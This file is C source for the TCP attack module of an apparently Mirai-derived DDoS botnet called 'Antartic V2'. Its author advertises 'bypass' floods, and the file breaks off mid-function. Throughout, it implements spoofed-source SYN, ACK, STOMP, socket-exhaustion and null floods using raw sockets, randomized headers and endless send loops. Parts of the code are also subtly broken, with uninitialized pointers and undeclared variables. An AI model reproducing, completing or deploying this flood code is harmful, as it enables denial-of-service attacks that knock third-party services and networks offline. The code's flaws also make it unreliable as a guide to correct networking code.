/*
----------------------------------------------------------------------------------------------------------------------------
TCP Attack Table For Antartic V2, Randomized Options For TCP Flood, Randomized MSS Values/Scale And OPT Data. (Bypass)
Includes HTTP Flood, Socket Flood, TCP Handshake/STOMP With Randomized Flag Values, Flood With TCP Connection Reset, (Bypass)
Customized Payload (Minecraft) And Segment. Method Respond's With False Data So All Value's Within The Packet Are Encrypted.
----------------------------------------------------------------------------------------------------------------------------
I Would've Created Table Value's For Some Of The Attacks But I Didn't Find A Point In Doing That So The Character's Are //
----------------------------------------------------------------------------------------------------------------------------
Included Bypass Floods
TCP_Bypass (Advanced Socket Flood, Randomized Data Size 768-500%)
ACK_Flood (ACK, Rand Sequence, Sourceports Randomized)
STOMP_Flood (STOMP, Handshake)
SYN_Flood (Opts, WRA Payload + Randnum)
NULL_Flood (TCP Reset, Segment, YellowSYN Payload)//Minecraft Payload Was Removed.)
------------------------------------------------------------------------------------------------------------------------------
Sexy Base Created By Yours Truly Carl Daddy/Divine. [PRIVATE ATK Methods]
------------------------------------------------------------------------------------------------------------------------------
*/

#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h" 
#define PHI 0x9e3779b9 //Hashing Content.
#define MAX_FDS 1000
#define NONBLOCK

static ipv4_t get_dns_resolver(void);
static unsigned long int Q[4096], c = 362436;

struct tcpopts
{
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;

};
void rand_options(struct tcpopts *tcprand){
        tcprand->nop_nouse = 0x01;
        tcprand->nop_nouse2 = 0x01;
        tcprand->nop_nouse3 = 0x01;
        tcprand->msskind = 0x02;
        tcprand->mssvalue = randnum(0, 65534);
        tcprand->msslen = 0x04;
        tcprand->wskind = 0x03;
        tcprand->wslen = 0x03;
        tcprand->wsshiftcount = shiftcount[randnum(0, 4)];
        tcprand->sackkind = 0x04;
        tcprand->sacklen = 0x02;
}
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}

void attack_tcp_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
    int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    uint8_t shiftcount[5] = {0x00, 0x03, 0x06, 0x09, 0x08};
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    //char *ssh_payload;
    //int ssh_payload_len;
    //table_unlock_val(TABLE_ATK_TCP);
    //ssh_payload = table_retrieve_val(TABLE_ATK_TCP, &ssh_payload_len);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    //Randomizing Source Ports.
    if (sport == 0xffff)
    {
        //myb
        sport = htons(10000 + rand_next() % (65535 - 10000));
    } else {
        sport = htons(sport);
    }
    if ((fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 24 + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24); // tcp options
        if (dont_frag)
        iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        rand_options(tcprand);
        tcph->doff = ((sizeof (struct tcphdr)) + 24)/4;
        tcph->syn = 1;
        tcph->rst = rand();
        tcph->ack = rand();
        tcph->window = rand() % 64240;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *opts++ = 8;
        *((uint16_t *)opts) = htons(1500 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 5;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 20;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 1;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 10;
        *opts++ = 5;
        char stronka[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
        stronka[3] = mssvalues[rand() % 9];//mss
        stronka[7] = randnum(6, 11);//ws scale
        stronka[12] = randnum(1, 250);//tss
        stronka[13] = randnum(1, 250);
        stronka[14] = randnum(1, 250);
        stronka[15] = randnum(1, 250);
        const char *newpayload = stronka;
        memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
            int packet_lenght = 0;
            int ports[data_len];
            int ackseq[data_len];
            int seqid[data_len];
            int portd[data_len];

            packet_lenght = randnum(0,data_len);

            for(int i = 0; i <= data_len; i++){

            portd[i] = htons(randnum(55000, 64827));
            ports[i] = htons(randnum(55000,64932));
            ackseq[i] = htons(randnum(27910, 398827));
            seqid[i] = htons(randnum(27910917, 488278084));
            }

            if (targs[i].netmask < 32)
            iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
            iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
            tcph->source = htons(ports[randnum(0, data_len)]);
            if (dport == 0xffff)
            tcph->dest = htons(ports[randnum(0, data_len)]);
            if (seq == 0xffff)
            tcph->seq = htons(seqid[randnum(0, data_len)]);
            if (ack == 0xffff)
            tcph->ack_seq = htons(ackseq[randnum(0, data_len)]);
            iph->check = 0;
            tcph->check = 0;
            rand_options(tcprand);
            tcph->doff = ((sizeof (struct tcphdr)) + 24)/4;
            iph->check = csum ((unsigned short *) pkt, iph->tot_len);
            iph->ttl = randnum(100,130);
            iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
            iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
            tcph->source = htons(rand_cmwc() & 0xFFFF);
            tcph->window = htons(windows[rand() % 11]);
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + packet_lenght + 24), sizeof (struct tcphdr) + 24 + packet_lenght + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 24, + packet_lenght + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_ssh_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        while (1)
            sleep(1);
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        while (1)
            sleep(1);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

        stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);

        // Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        // Set up the packet
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].seq;
                        tcph->ack_seq = stomp_data[i].ack_seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;

                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}
void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    uint16_t size = 0;
    uint16_t port = 0;

    //("TCP Bypass!\n");

    size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512); // Default size to 1 (random) if not specified
    port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); // Default to 65535 if port not specified

    struct sockaddr_in addr;
    char *buf = (char *)malloc(size);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    memset(buf, 0, size);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for(clear = 0; clear < MAX_FDS; clear++)
    {
        states[clear].fd = -1;
        states[clear].state = 0;
        states[clear].timeout = 0;
    }

    while(1)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for(i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    NONBLOCK(states[i].fd);
                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                case 1:
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET,SO_ERROR, &err, &err_len);

                        if(err)
                        {
                            close(states[i].fd);
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }

                        states[i].state = 2;
                        continue;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                case 2:
                    if(size == 1)
                        size = 768 + rand() % 400; //random size between 500-900, randomizes with each packet
                    else
                        size = size;

                    rand_str((unsigned char*)buf, size);

                    if(send(states[i].fd, buf, size, MSG_NOSIGNAL) == -1 && errno != EAGAIN) // Finished send
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
            }
        }
    }

    return;
}
void attack_ack_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    int windows[3] = {29200, 64240, 65535};
    int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    int ctos[3] = {0, 40, 72};
    uint8_t shiftcount[5] = {0x00, 0x03, 0x06, 0x09, 0x08};
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 2056);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    //char *ack_payload;
    //int ack_payload_data;
    //table_unlock_val(TABLE_ATK_ACKSEQ); (No Need For This Function.)
    //ssh_payload = table_retrieve_val(TABLE_ATK_ACKSEQ, &ack_payload_data);

    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if (sport == 0xffff)
    {
        //Randomizing Source port Data.
        sport = htons(10000 + rand_next() % (65535 - 10000));
    } else {
        sport = htons(sport);
    }
    if ((fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 24 + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89", 24); //Ack Payload, Dump Data.
        if (dont_frag)
        iph->frag_off = htons(0x4000);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF); //Expecting Handshake And SYN/ACK But Responding With An Attack.
        tcph->doff = ((sizeof (struct tcphdr)) + 24)/4;
        tcph->ack = 1;
        //tcph->seq = rand();
        tcph->ack_seq = randnum(10000,99999);
        rand_options(tcprand);
        iph->tos = ctos[randnum(0,2)];
        tcph->window = htons(64240);
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *opts++ = 8;
        *((uint16_t *)opts) = htons(1500 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 5;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 20;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 1;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 10;
        *opts++ = 5;
        char stronka[] = "\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89";
        stronka[3] = mssvalues[rand() % 11];//mss
        stronka[2] = randnum(4, 5);
        stronka[3] = stronka[2] == 5 ? randnum(1, 180) : randnum(1, 250);
        stronka[7] = 10;
        stronka[8] = randnum(1, 250);
        stronka[17] = 3;
        stronka[18] = 3;
        stronka[19] = randnum(6,9);
        stronka[20] = 34;
        stronka[22] = randnum(1,255);
        stronka[23] = randnum(1,255);
        tcph->window = htons(windows[randnum(0,2)]);
        const char *ackpayload = stronka;
        memcpy((void *)tcph + sizeof(struct tcphdr), ackpayload, 24);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
            int packet_lenght = 0;
            int ports[data_len];
            int ackseq[data_len];
            int seqid[data_len];
            int portd[data_len];

            packet_lenght = randnum(0,data_len);

            for(int i = 0; i <= data_len; i++){

            portd[i] = htons(randnum(55000, 64827));
            ports[i] = htons(randnum(55000,64932));
            ackseq[i] = htons(randnum(27910, 398827));
            seqid[i] = htons(randnum(27910917, 488278084));
            }

            if (targs[i].netmask < 32)
            iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
            iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
            tcph->source = htons(ports[randnum(0, data_len)]);
            if (dport == 0xffff)
            tcph->dest = htons(ports[randnum(0, data_len)]);
            if (seq == 0xffff)
            tcph->seq = htons(seqid[randnum(0, data_len)]);
            if (ack == 0xffff)
            tcph->ack_seq = randnum(10000, 99999);
            rand_options(tcprand);
            tcph->doff = ((sizeof (struct tcphdr)) + 24)/4;
            iph->ttl = randnum(40, 130);
            iph->check = 0;
            tcph->check = 0;
            iph->check = csum ((unsigned short *) pkt, iph->tot_len);
            iph->ttl = randnum(100,130);
            iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
            iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
            tcph->source = htons(rand_cmwc() & 0xFFFF);
            tcph->window = htons(windows[rand() % 11]);
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + packet_lenght + 24), sizeof (struct tcphdr) + 24 + packet_lenght + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 24, + packet_lenght + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_tcp_null(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
    printf("TCP Bypass Randomized Hex Data.\n");
    #endif

    int i, fd;
    char name_buf[16];
    int name_buf_len;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
